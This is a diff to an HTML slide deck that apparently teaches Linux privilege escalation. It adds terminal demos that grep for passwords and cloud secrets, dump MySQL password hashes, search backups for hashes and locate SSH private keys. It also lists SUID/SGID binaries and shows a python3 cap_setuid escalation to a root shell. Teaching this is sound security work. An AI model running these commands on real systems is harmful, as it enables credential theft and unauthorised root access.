@@ -110,23 +110,21 @@
 							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="1">Vulnerabilities (CVE)</li>
 							<ul class="fragment" data-fragment-index="2">
 								<li style="font-size: 0.5em;">Kernel</li>
-								<li style="font-size: 0.5em;">OS Services/Daemons</li>
+								<li style="font-size: 0.5em;">Services/Daemons</li>
 								<li style="font-size: 0.5em;">Binaries (sudo, …)</li>
-								<li style="font-size: 0.5em;">Local Port/Services (MySQL, Redis, ...)</li>
 							</ul>
 							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="3">Credentials/SSH Keys Leakage</li>
 							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="4">File Permissions</li>
-							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="5">Sudo</li>
-							<ul class="fragment" data-fragment-index="6">
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="5">SUID, SGID</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="7">Capability</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="6">Cronjob</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="8">Sudo</li>
+							<ul class="fragment" data-fragment-index="9">
 								<li style="font-size: 0.5em;">NOPASSWD</li>
 								<li style="font-size: 0.5em;">secure_path</li>
 								<li style="font-size: 0.5em;">dangerous binaries</li>
 								<li style="font-size: 0.5em;">env_keep (PATH, PYTHONPATH, LD_PRELOAD)</li>
-	
 							</ul>
-							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="7">Cronjob</li>
-							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="8">Capability</li>
-							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="9">SUID, SGID</li>
 							<li style="font-size: 0.7em; color: rgb(150, 212, 231);"  class="fragment" data-fragment-index="10">
 								<div class="fragment highlight-red grow" data-fragment-index="11">
 									Custom Developed Scripts
@@ -140,37 +138,233 @@
 				<section><p style="color: rgb(150, 212, 231);">Vulnerabilities</p>
 					
 					<section data-transition="fade">
-						<!-- <video
-							data-autoplay
-							src="media/video/kernel_CVE-2024-1086.mp4"
-						></video> -->
-						<!-- <video src="media/video/kernel_CVE-2024-1086.mp4" data-preview-video></video> -->
 						<img src="media/image/kernel_CVE-2024-1086.png" data-preview-video="media/video/kernel_CVE-2024-1086.mp4">
 							
 					</section>
 
 					<section data-transition="fade">
-						<!-- <img height="100%" src="media/video/polkit_CVE-2021-4034.gif"></img>
-						<br>
-						daemon polkit CVE-2021-4034 -->
 						<img src="media/image/polkit_CVE-2021-4034.png" data-preview-image="media/video/polkit_CVE-2021-4034.gif">
 					</section>
 
 					<section data-transition="fade">
-						<!-- <video
-							data-autoplay
-							src="media/video/sudo_CVE-2021-3156.mp4"
-						></video>
-						sudo CVE-2021-3156 -->
 						<img src="media/image/sudo_CVE-2021-3156.png" data-preview-video="media/video/sudo_CVE-2021-3156.mp4">
 					</section>
 				</section>
 
-				<!-- <section>
-					Sudo  
-					<br>CVE-2021-3156
-				</section> -->
+				<section>
+					<p style="color: rgb(150, 212, 231);">Credentials/SSH Keys</p>
 
+					<section class="text-left">
+						<p>config/env files</p>
+
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+							$ grep -i 'pass\|secret' /home/*/.env /root/.bashrc
+
+							/home/ubuntu/.env:
+							DB_PASSWORD="d#bP@ssw0rd2024!"  # Plaintext database password
+
+							/root/.bashrc:
+							export AWS_SECRET="AKIAEXAMPLEKEY123"  # AWS credentials leaked
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						<p>databases</p>
+
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+							mysql -u app_user -p'password' -e "SELECT username,password FROM mysql.users" 2>/dev/null
+
+							+------------+-------------+
+							| table_name | column_name |
+							+------------+-------------+
+							| users      | password    |
+							| admins     | pwd_hash    |
+							+------------+-------------+
+
+							+----------+-------------------------------------------+
+							| username | password                                  |
+							+----------+-------------------------------------------+
+							| admin    | 5f4dcc3b5aa765d61d8327deb882cf99          |  # MD5('password')
+							| john     | *A4B6157319038724E3560894F7F932C8886EBFCF |  # MySQL hashed
+							+----------+-------------------------------------------+
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						<p>hashes (.htpasswd, shadow file, db backups, ...)</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+							$ grep -r -i -E "(password|passwd|pwd|md5|sha1|sha256|sha512|bcrypt|scrypt|PBKDF2)[=:]['\"]?[0-9a-f]{32,128}['\"]?" /var/www/backups/ 2>/dev/null
+
+							/var/www/backups/db_dump_2023.sql:INSERT INTO users VALUES (1, 'admin', 'PBKDF2$sha256$10000$salt123$5f1d3b2a8c9e7d6f5e4d3c2b1a09876fedcba9876543210abcdef0123456789');
+							/var/www/backups/old/config.inc.php:  "db_password" => "$2y$10$N9qo8uLOickgx2ZMRZoMy.MKQ5VHI7/pW0G5rheGAP.8FJKZ9DGi",
+							/var/www/backups/temp/user_export.csv:2,john_doe,5f4dcc3b5aa765d61d8327deb882cf99,active  # <-- MD5 hash
+							/var/www/backups/mysql/auth_table.sql:UPDATE `auth` SET `password`='sha1:64000:18:XYZ123==:PClkdf9+WqR7VpJmNtQrLw==' WHERE user_id=5;
+							/var/www/backups/.hidden/config.bak:database.password = bcrypt$2a$10$2Bp2jD5xVUR9QoKYfLxPZeXr1W5sL3JX8cTjK9WQ1YbGvNnHqRt2S
+						</code></pre>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+
+							$ grep -r -i -E "(password|pwd|md5|sha1)[=:]['\"]?[0-9a-f]{32,}['\"]?" /backups/
+							/backups/prod_db.sql:INSERT INTO users (login,pass) VALUES ('admin','c4ca4238a0b923820dcc509a6f75849b'); # MD5('1')
+							/backups/config.php:  'DB_PASS' => '$2y$10$BqTb8h6W94SdT0zYwWBr9eIqXUJZJG7Lc9VbNd.7JkG8FtZQYHXaK',
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						<p>Look for SSH Keys (.ssh | id_rsa)</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-5|5">
+							$ find / 2>/dev/null | grep -i '/\.ssh|id_rsa'
+							/home/user/.ssh
+							/home/user/.ssh/id_rsa
+							/home/user/.ssh/id_rsa.pub
+							/root/.ssh
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						<p>Look for ssh key format</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-9|9">
+							$ for f in $(find / 2>/dev/null | grep -i '/\.ssh'); do
+								grep -r 'PRIVATE KEY' $f; 
+							done
+							
+							/home/user/.ssh/id_rsa:-----BEGIN OPENSSH PRIVATE KEY-----
+							/home/user/.ssh/id_rsa:-----END OPENSSH PRIVATE KEY-----
+							-----BEGIN OPENSSH PRIVATE KEY-----
+							-----END OPENSSH PRIVATE KEY-----
+							grep: /root/.ssh: Permission denied
+						</code></pre>
+					</section>
+
+				</section>
+
+				<section>
+					<p style="color: rgb(150, 212, 231);">File Permissions</p>
+
+					<section class="text-left">
+						<p>Look for writable files/dirs</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+							$ find / -perm /g=w,o=w 2>/dev/null
+
+							/tmp/cron_job.sh
+							/var/tmp/backup_script.sh
+							/dev/shm/temp_cleanup.sh
+							/home/developer/scripts/malicious_payload.sh
+							/opt/insecure_app/logs/rotate_logs.sh
+							/usr/local/share/misc/test_script.sh
+						</code></pre>
+
+						<ul>
+							<li style="font-size: 0.6em;" class="fragment">Writable SUID Binaries</li>
+							<li style="font-size: 0.6em;" class="fragment">Writable /etc/passwd - shadow</li>
+							<li style="font-size: 0.6em;" class="fragment">Writable Cron Scripts</li>
+							<li style="font-size: 0.6em;" class="fragment">Writable Systemd Service Files</li>
+							<li style="font-size: 0.6em;" class="fragment">Writable SSH Authorized Keys</li>
+							<li style="font-size: 0.6em;" class="fragment">Writable Docker Socket</li>
+						</ul>
+					</section>
+
+				</section>
+
+				<section>
+					<p style="color: rgb(150, 212, 231);">SUID, SGID</p>
+
+					<section>
+						<div class="text-left">
+							<p class="fragment">Runs as the owner (user and group)</p>
+							<p class="fragment">Changes the euid and egid of a process</p>
+							<p class="fragment">The Double-Edged Sword</p>
+							<p class="fragment">the permission format : X000</p>
+							<ul class="fragment">
+								<li>suid : 4</li>
+								<li>sgid : 2</li>
+								<li>sticky bit : 1</li>
+							</ul>
+						</div>
+					</section>
+
+					<section>
+						<div class="text-left">
+							<p class="fragment">Find suid binaries</p>
+
+							<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+								$ find / -perm -4000 -type f -ls 2>/dev/null
+								5998     72 -rwsr-xr-x   1 root     root        70616 Mar 23  2023 /usr/bin/chfn
+								6008     68 -rwsr-xr-x   1 root     root        69064 Mar 23  2023 /usr/bin/chsh
+								6358     68 -rwsr-xr-x   1 root     root        67744 Apr 18  2023 /usr/bin/fusermount3
+								6429    136 -rwsr-xr-x   1 root     root       137352 Mar 23  2023 /usr/bin/gpasswd
+								7099     72 -rwsr-xr-x   1 root     root        71376 Mar 23  2023 /usr/bin/newgidmap
+								7100     68 -rwsr-xr-x   1 root     root        69176 Mar 23  2023 /usr/bin/newgrp
+								7101     72 -rwsr-xr-x   1 root     root        71376 Mar 23  2023 /usr/bin/newuidmap
+								7318     72 -rwsr-xr-x   1 root     root        72048 Mar 23  2023 /usr/bin/passwd
+								7481     68 -rwsr-xr-x   1 root     root        67640 Jan 31  2023 /usr/bin/pkexec
+								606075    132 -rwsr-xr-x   1 root     root       133312 Nov 21 20:01 /usr/bin/su
+								606465     68 -rwsr-xr-x   1 root     root        67744 Nov 21 20:01 /usr/bin/mount
+								606466     68 -rwsr-xr-x   1 root     root        67744 Nov 21 20:01 /usr/bin/umount
+								638349    196 -rwsr-xr-x   1 root     root       199472 Oct 27 14:16 /usr/bin/ntfs-3g
+								763422    548 -rwsr-xr-x   1 root     root       600536 Apr  6 13:32 /usr/bin/sudo
+							</code></pre>
+							<!-- <img src="media/image/Screenshot 2025-04-07 at 1.06.34 PM.png"> -->
+						</div>
+					</section>
+					<section>
+						<div class="text-left">
+							<p class="fragment">Find sgid binaries</p>
+
+							<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+								$ find / -perm -2000 -type f -ls 2>/dev/null
+								5990    136 -rwxr-sr-x   1 root     shadow     137424 Mar 23  2023 /usr/bin/chage
+								6049     68 -rwxr-sr-x   1 root     crontab     68032 Mar  2  2023 /usr/bin/crontab
+								6181     20 -rwxr-sr-x   1 root     mail        18888 Feb  4  2021 /usr/bin/dotlockfile
+								6282     68 -rwxr-sr-x   1 root     shadow      67880 Mar 23  2023 /usr/bin/expiry
+								607494    516 -rwxr-sr-x   1 root     _ssh       526568 Dec  8 00:14 /usr/bin/ssh-agent
+								41665     68 -rwxr-sr-x   1 root     utmp        67512 Feb 26  2023 /usr/lib/aarch64-linux-gnu/utempter/utempter
+								197589     68 -rwxr-sr-x   1 root     video       67528 Jan 29  2023 /usr/lib/w3m/w3mimgdisplay
+								618445     68 -rwsr-sr-x   1 root     root        67800 Oct 26 11:08 /usr/lib/xorg/Xorg.wrap
+								198838     68 -rwxr-sr-x   1 root     shadow      67680 Sep 21  2023 /usr/sbin/unix_chkpwd
+							</code></pre>
+							<!-- <img src="media/image/Screenshot 2025-04-07 at 1.06.34 PM.png"> -->
+						</div>
+					</section>
+				</section>
+					
+				<section>
+					<p style="color: rgb(150, 212, 231);">Capability</p>
+					<section class="text-left">
+						<p class="fragment">Modern and Narrow approach to extend privileges</p>
+						<p class="fragment">Special permissions for specific tasks</p>
+						<p class="fragment">Example:</p>
+						<ul class="fragment">
+							<li>cap_net_bind_service</li>
+							<li>cap_setuid</li>
+						</ul>
+					</section>
+
+					<section class="text-left">
+						Find all capabilities in binaries
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-5|2">
+							$ getcap -r / 2>/dev/null
+							/usr/bin/python3.11 cap_setuid=ep
+							/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
+							/usr/bin/nc.traditional cap_net_bind_service=eip
+							/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						Exploitation
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-9|7-9">
+							$ python3
+							Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux
+							Type "help", "copyright", "credits" or "license" for more information.
+							>>> import os
+							>>> os.setuid(0)
+							>>> os.system('/bin/bash')
+							┌─[root@parrot]─[~/suid_sgid]
+							└──╼ #id
+							uid=0(root) gid=1000(user) groups=1000(user),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),106(netdev),110(lpadmin),114(bluetooth),116(scanner)
+					</section>
+
+				</section>
 
 				<!-- <section data-markdown>
 					<textarea data-template>
